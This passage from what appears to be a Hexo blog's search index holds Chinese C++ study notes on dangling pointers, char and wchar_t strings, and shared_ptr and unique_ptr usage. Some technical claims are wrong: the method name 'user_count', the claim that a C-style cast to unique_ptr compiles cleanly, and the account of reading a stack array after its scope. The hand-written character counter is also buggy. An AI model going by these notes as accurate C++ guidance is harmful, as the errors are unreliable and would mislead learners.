class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    &#123;</span><br><span class="line">        std::unique_ptr&lt;<span class="type">int</span>[]&gt; a&#123; std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>[]&gt;(<span class="number">50</span>) &#125;;</span><br><span class="line">        a[<span class="number">2</span>] = <span class="number">110</span>;</span><br><span class="line">        p = a.<span class="built_in">get</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>智能指针之前学过，它的原型是一个类，当这个类超过实例所处作用域的时候会调用析构函数，也就会自动释放内存资源。</p><img src="/2022/05/20/pointerText/001.png" class=""><p><strong>在{}作用域内时，智能指针a的生命周期还在，然后指针p接受指针a的地址，出了{}作用域之后，a自动释放了，指针p也就没有指向的内存了，图中两个输出可以看到结果</strong></p><hr><h2 id="No-2"><a href="#No-2" class="headerlink" title="No.2"></a>No.2</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line">        p = a;</span><br><span class="line">        std::cout &lt;&lt; p[<span class="number">2</span>] &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; p[<span class="number">2</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>no1的时候由于内存是new的，也就是存放在堆区。<br>而现在是创建了一个数组，这种方式内存会分配到栈区，按照常理，栈区的变量在离开它所处的作用域后也会自动销毁。<br>但是通过打印我们发现<img src="/2022/05/20/pointerText/002.png" class=""><br>它的值仍然在，原因在于数组a的处于栈区时未被回收，如果处于其他函数里就会被回收掉。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ol><li>指针销毁了，但是指向的内存还在</li><li>内存销毁回收了，指针却还在</li></ol><p>指针虽然很方便，但是也挺危险。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>string</title>
      <link href="/2022/05/19/string/"/>
      <url>/2022/05/19/string/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul><li>[] &#x3D; “”<br>属于c语言的方式</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>C语言是没有string类型的，那么要表示字符串就是通过char[]来实现。<br>声明方式就是<code>char ch[] = &quot;hello&quot;;</code><br>复古机器人点就是<code>char ch[] = &#123;&#39;H&#39;,&#39;E&#39;,&#39;L&#39;,&#39;L&#39;,&#39;O&#39;,&#39;\0&#39;&#125;;</code>,当然鬼才用这个。<br>指针也ok，不过需要强转，因为默认不认识字符串<code>char *ch = (char*)&quot;hello&quot;;</code><br>但是要注意字符串末尾其实跟了一个<code>\0</code>作为结束，因为数组的本质是一块连续的内存空间，它需要区分。</p><blockquote><p>有印象的应该知道，strlen和sizeof一个字符串的区别。</p></blockquote><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>假设有一个数字<code>char str[255] &#123;&quot;Hello张三&quot;&#125;;</code>，编码环境为gbk<br>它的内存分析为：<img src="/2022/05/19/string/000.png" class=""><br>张在gbk中需要两个字节来表示，所以原本应该是0xc5d5，但是由于是char类型，排放顺序从低位到高位，所以说先存d5再存c5。</p><hr><h2 id="c-x2F-wchar-t"><a href="#c-x2F-wchar-t" class="headerlink" title="c&#x2F;wchar_t"></a>c&#x2F;wchar_t</h2><p>宽字符：一般占用两个字节。即H 在内存中表现为0x0048,依然按照低位在前高位在后的顺序排放。</p><img src="/2022/05/19/string/002.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> ch1[] = &#123; <span class="string">&quot;hello world&quot;</span> &#125;;      <span class="comment">//直接声明就报错了</span></span><br></pre></td></tr></table></figure><img src="/2022/05/19/string/001.png" class=""><p>原因是默认的字符串还是以char为组合，需要向编译器声明是宽字符型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> ch1[] = &#123; <span class="string">L&quot;hello world&quot;</span> &#125;;</span><br></pre></td></tr></table></figure><p>也就是在字符串前加一个大写的L。</p><p><strong>注意：宽字符一般采用Unicode编码，所以中文在Unicode和gbk的表现是不一样的</strong></p><blockquote><p>输入采用wscanf，输出采用wprintf，类型前加大写L转换。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> ch[<span class="number">0xff</span>];</span><br><span class="line"><span class="built_in">wscanf</span>(<span class="string">L&quot;%s&quot;</span>, ch);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;%s&quot;</span>, ch);</span><br></pre></td></tr></table></figure><p><strong>如果scanf报错，在头文件上加一句<code>#define _CRT_SECURE_NO_WARNINGS</code></strong></p><p>当然这里还是值得一提的，为什么vs使用scanf会报错，这是因为scanf如果不限定长度，那么就有可能导致溢出，一旦溢出了，你往里面塞的如果是一些计算机相关的命令，就有可能被执行。所以vs推荐使用scanf_s，但是对于新手来说_s还是有点小麻烦的。</p><img src="/2022/05/19/string/003.png" class=""><p>举个例子，字符串设置长度5，但是你输入了一堆，编译器这里肯定会发生异常报错。</p><img src="/2022/05/19/string/004.png" class=""><p>使用微软的_s，则相对安全，一旦你输入的内容长度超过了它限定的范围，那么程序就不接收你输入的东西。<br>不过有一说一，还有gets之类的输入方式，scanf是相对而言比较多的使用。所以不能防范所有的溢出问题。</p><hr><h2 id="cpp-x2F-wchar-t"><a href="#cpp-x2F-wchar-t" class="headerlink" title="cpp&#x2F;wchar_t"></a>cpp&#x2F;wchar_t</h2><p>c++的输入输出是通过cin&#x2F;cout来实现，虽然可以使用C语言的方式，但是还是要记住c++本身的特性。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">0x10</span>];</span><br><span class="line">    std::cout &lt;&lt; x;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>正常情况下，x没有赋值，就相当于是指针，那么cout x就是输出x的地址<br>但是char不一样，cout默认会将其当为字符串输出，就会导致乱码。</p></blockquote><img src="/2022/05/19/string/005.png" class=""><p>两者之间的区别还是很明显的</p><img src="/2022/05/19/string/006.png" class=""><p>当然std指定输出格式也凑合，比较printf就是通过指定格式化输出实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> ch[<span class="number">0xff</span>];</span><br><span class="line">std::wcout &lt;&lt; <span class="string">&quot;请输入：&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::wcin &gt;&gt; ch;</span><br><span class="line">std::wcout &lt;&lt; ch;</span><br></pre></td></tr></table></figure><blockquote><p>差别不大，就是宽字符的输入输出都加个w，然后注意一下编码环境</p></blockquote><hr><h2 id="wcslen"><a href="#wcslen" class="headerlink" title="wcslen"></a>wcslen</h2><p>统计字符串都知道使用strlen，宽字符也有自己的统计函数<code>wcslen</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;locale&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL, <span class="string">&quot;chs&quot;</span>);   <span class="comment">//指定环境编码</span></span><br><span class="line"><span class="type">wchar_t</span> ch[<span class="number">0xff</span>];</span><br><span class="line">std::wcout &lt;&lt; <span class="string">L&quot;请输入：&quot;</span> &lt;&lt; std::endl; </span><br><span class="line">std::wcin &gt;&gt; ch;</span><br><span class="line">std::wcout &lt;&lt; ch &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">wcslen</span>(ch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/19/string/007.png" class=""><p><strong>值得一提的是，宽字符在指定编码下一般都是两个字节为一个字符，所以对于统计中英文时，会相对而言方便，但是内存上占用高了些，而char需要两个字节统计一个中文</strong></p><img src="/2022/05/19/string/008.png" class=""><hr><h2 id="自己实现strlen"><a href="#自己实现strlen" class="headerlink" title="自己实现strlen"></a>自己实现strlen</h2><p>其实也不难，我们知道字符串以’\0’结尾，那就直接循环然后让一个变量自增直到’\0’结束就行了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tjs</span><span class="params">(<span class="type">char</span> *ch)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (*ch++ != <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; n &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>传一个指针，因为数组本质上就是一个指针，所以问题不大。</p></blockquote><hr><h2 id="自制能统计带中文的字符串"><a href="#自制能统计带中文的字符串" class="headerlink" title="自制能统计带中文的字符串"></a>自制能统计带中文的字符串</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tjsp</span><span class="params">(<span class="type">char</span> *ch)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (*ch++ != <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (*ch &lt; <span class="number">0</span>)&#123;</span><br><span class="line">n++;</span><br><span class="line">*ch++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; n &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实一开始想的是中文需要两个char类型接受，然后一个char的上限是0xff，然后突然想到中文在两个char下其实两边都不一定会到0xff。<br>那好就从ascii码入手，<img src="/2022/05/19/string/009.png" class=""><br>可以看到ascii上限是0x7f，那如果*ch大于0x7f也就是说他有可能就是中文字符。。。<br>但是好景不长，结果还是不对，然后我就打断点debug了一下，发现它读取字符串的时候，遇到中文都是转换成了负数。。。<img src="/2022/05/19/string/010.png" class=""><br>这个原理我还没搞明白，但是这么一搞，直接让他&lt;0的时候n自增一次，然后指针跳过一个不就能实现了吗。。。</p><img src="/2022/05/19/string/011.png" class=""><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>字符串还好，c语言那会学过，基本都没啥问题，除了编码不同的时候，比较搞事情。</p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>smartPointer1</title>
      <link href="/2022/05/19/smartPointer1/"/>
      <url>/2022/05/19/smartPointer1/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>c++ 11：</p><ul><li>std::shared_ptr</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shared顾名思义就是共享的意思，这个共享指针当然也属于智能指针这一块。</p><p>语法上:<br><code>std::shared_ptr&lt;type&gt; tyename</code><br>例如:<br><code>std::shared_ptr&lt;int&gt; a&#123;&#125;</code><br><code>std::shared_ptr&lt;int&gt; b&#123; std::make_shared&lt;int&gt;(0) &#125;</code><br><strong>注意:std::make_shared不支持数组</strong><br><code>std::shared_ptr&lt;int[]&gt; c&#123; new int[5]&#123;1,2,3,4,5&#125; &#125;</code></p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">std::shared_ptr&lt;<span class="type">int</span>[]&gt; sp&#123;<span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;&#125;;</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp1&#123; std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">5</span>) &#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; sp[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp1[<span class="number">0</span>] &lt;&lt; std::endl;   <span class="comment">//与unique一样，初始化时是单个int则无法使用[]调用</span></span><br></pre></td></tr></table></figure><img src="/2022/05/19/smartPointer1/000.png" class=""><p>回到起点，shared是共享的意思，也就是说，共享指针是可以被其他共享指针所指向的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp1&#123; std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">5</span>) &#125;;</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp2&#123; sp1 &#125;;</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp3&#123; sp1 &#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; sp1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; *sp1 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp2 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; *sp2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp3 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; *sp3 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/19/smartPointer1/001.png" class=""><p>可以看到sp2和sp3的地址和地址上的值都与sp1一致。</p><hr><h2 id="user-count"><a href="#user-count" class="headerlink" title="user_count"></a>user_count</h2><p>如果有多个共享指针指向同一地址，那么只有最后一个共享指针释放内存的时候，才能真正释放所占用的内存空间，也就这个原因，导致shared_ptr会记录这个地址被多少个智能指针调用。<br>有记录的属性，也就意味着shared_ptr会占用的更多内存。</p><p>查看的方式也很简单，就是调用<code>.user_count()</code></p><p>比如上面的代码，我们调用一个试试：<img src="/2022/05/19/smartPointer1/002.png" class=""><br>共享属性所以<code>.user_count()</code>在sp1或者2和3上得到的都是一个结果，因为它们指向同一块内存。</p><hr><h2 id="unique"><a href="#unique" class="headerlink" title="unique"></a>unique</h2><p>能统计就能判断是否被其他指针调用。<br>利用<code>.unique()</code>获取一个智能指针是否是唯一拥有该地址的。<br><strong>注：unique返回的是bool类型的值</strong></p><img src="/2022/05/19/smartPointer1/003.png" class=""><p>这里是sp1、2、3自然不用多想都是0，也就是false。</p><blockquote><p>另外值得一提的是，因为这个功能稍显鸡肋，c++17的时候把它废除了。。。。。</p></blockquote><hr><h2 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h2><p>在user_cout的时候说了一下，shared_ptr指针指向的内存空间只有当最后一个指向它的shared_ptr指针去释放的时候才会真正被释放掉，不然其余几个释放只是将自己置为nullptr。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp1&#123; std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">5</span>) &#125;;</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp2&#123; sp1 &#125;;</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sp3&#123; sp1 &#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; sp1 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp3 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">sp1.<span class="built_in">reset</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; sp1 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; sp3 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/19/smartPointer1/004.png" class=""><p>能看到sp1自己被置空了，sp2和sp3仍然指向sp1之前指向的内存地址。<br>再把sp2reset掉后也是一个样子<img src="/2022/05/19/smartPointer1/005.png" class=""><br>所以说只有将最后一个指向那片内存区域的指针释放了才是真正意义上的释放内存空间<img src="/2022/05/19/smartPointer1/006.png" class=""></p><p>当然如果有一定怀疑，还可以在reset前后看看use_count的情况</p><img src="/2022/05/19/smartPointer1/007.png" class=""><p>例如sp1和sp2都被reset了，能看到sp3指向的内存区域现在就只有一个指针指向它。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>没啥心得体会，就是感觉shared_ptr在内存占用上要么高一点，要么有一部分内存都写了特定的东西了，就比如说统计多少个指向这块内存的指针。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>smartPointer</title>
      <link href="/2022/05/16/smartPointer/"/>
      <url>/2022/05/16/smartPointer/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>c++ 11:</p><ul><li>std::unique_ptr</li></ul><p>c++ 14:</p><ul><li>std::make_unique</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>正常的指针如果是通过new或者malloc方式还需要额外的手动释放，delect或free。</p><p>智能指针的作用是防止忘记调用delete释放内存和程序异常的进入catch块忘记释放内存。另外指针的释放时机也是非常有考究的，多次释放同一个指针会造成程序崩溃，这些都可以通过智能指针来解决。</p><p>智能指针主要用于管理在堆上分配的内存，它将普通的指针封装为一个栈对象。当栈对象的生存周期结束后，会在析构函数中释放掉申请的内存，从而防止内存泄漏。<br>智能指针的作用是管理一个指针，因为存在以下这种情况：申请的空间在函数结束时忘记释放，造成内存泄漏。使用智能指针可以很大程度上的避免这个问题，因为智能指针是一个类，当超出了类的实例对象的作用域时，会自动调用对象的析构函数，析构函数会自动释放资源。所以智能指针的作用原理就是在函数结束时自动释放内存空间，不需要手动释放内存空间。</p><p>声明方式：<code>std::unique_ptr&lt;type&gt; typename&#123;&#125;</code>,<br>比如<code>std::unique_ptr&lt;int&gt; ptra&#123;std::make_unique&lt;int&gt; (150)&#125;</code></p><p>转到定义看到：<img src="/2022/05/16/smartPointer/000.png" class=""><br>能看到是用class写的，配合上模板。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>智能指针之所以智能，肯定会与传统指针有区别。</p><h2 id="no1"><a href="#no1" class="headerlink" title="no1 []"></a>no1 []</h2><p>比如说，传统指针无论大小，都可以用[]方式访问，但是智能指针就不行了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123; <span class="number">5</span> &#125; &#125;;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; p[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; intP[0] &lt;&lt; std::endl;    这一句会报错，编译器给的说明就是没有符合的[]运算符操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然很大程度上单个int不被认作为’数组‘。<br>传统指针需要通过<code>int *p = new int[5]</code>,这样才能严格算一个数组。<br>那么智能指针也不例外，需要用到[]，即<code>std::unique_ptr&lt;int[]&gt; intP&#123;new int[]&#123;0&#125;&#125;;</code></p><img src="/2022/05/16/smartPointer/001.png" class=""><p>能够看到是合法有效的。</p><hr><h2 id="no2-x3D"><a href="#no2-x3D" class="headerlink" title="no2 &#x3D;"></a>no2 &#x3D;</h2><p>传统指针之间可以套娃，多个指针指向一片内存区域</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *a = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line"><span class="type">int</span> *p = a;</span><br><span class="line"><span class="type">int</span> *p2 = a;</span><br><span class="line"><span class="type">int</span> *p3 = a;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p2 &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p3 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/002.png" class=""><blockquote><p>可以看到指针a由我们人为new了一块内存地址，紧接着其他指针都指向指针a的地址，但是如果a被释放了，那么其他指针就有可能成为野指针，是一种非常不妙的情况。除非特殊需求，一般也是会尽量避免这种写法。</p></blockquote><p>而智能指针则不允许多个只能指针指向一块区域(简单说就是智能指针a不能赋值给智能指针b)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span> &#125;;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP2 = intP;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/003.png" class=""><p>编译器自然而然的给出了错误。</p><p><strong>但是有一说一，强转还是很骚的，比如说：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *a = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP = (std::unique_ptr&lt;<span class="type">int</span>&gt;) &amp;a;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP2 = (std::unique_ptr&lt;<span class="type">int</span>&gt;)&amp;a;</span><br></pre></td></tr></table></figure><p>通过这种强转的方法，编译器也没有给出错误和警告。<br>当然这种假象让两个智能指针指向同一块内存也就是图一乐。<br>我们能想到的委员会也早想到了，所以每个版本的特性都特别重要。</p><hr><h2 id="no3-c-14初始化"><a href="#no3-c-14初始化" class="headerlink" title="no3 c++14初始化"></a>no3 c++14初始化</h2><p>c++14之后，在初始化的时候有新增了一种方式<br><code>std::unique_ptr&lt;int&gt; intP &#123; std::make_unique&lt;int&gt;() &#125;</code><br><code>std::unique_ptr&lt;int[]&gt; intP &#123; std::make_unique&lt;int[]&gt;() &#125;</code></p><p>二者区别在于第一种方式初始化时()代表了指针指向区域的初始化值为多少<br>第二种则是初始化通过()来声明有几个成员。</p><p>它的好处目前也没能感知到，百度看了几个大致说法就是更安全更简单，至于不能使用定制删除器和不能完美传递一个initializer_list都是目前没感知的。得等以后深入用到了在挖了。</p><hr><h2 id="rest"><a href="#rest" class="headerlink" title="rest()"></a>rest()</h2><p>reset能够释放智能指针的内存空间，并将其置为nullptr;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123;<span class="number">0</span>&#125; &#125;;</span><br><span class="line">intP.<span class="built_in">reset</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/004.png" class=""><p>内存地址置空跟变成全0意思相同，就是说没有地址了，申请的内存也还给系统了。</p><hr><h2 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h2><p>一开始使用智能指针的时候会感觉碍手碍脚，不像传统指针能通过*p &#x3D; 直接改变值的过程<br>所以get方法可以让一个指针指向智能指针指向的内存区域。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span> &#125;;</span><br><span class="line">p = intP.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/16/smartPointer/005.png" class=""><p>可以看到指针p也指向了智能指针指向的区域</p><p>然后进行修改：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p;</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; intP&#123; <span class="keyword">new</span> <span class="type">int</span>&#123;<span class="number">0</span>&#125; &#125;;</span><br><span class="line">p = intP.<span class="built_in">get</span>();</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; *intP &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line">*p = <span class="number">500</span>;</span><br><span class="line">std::cout 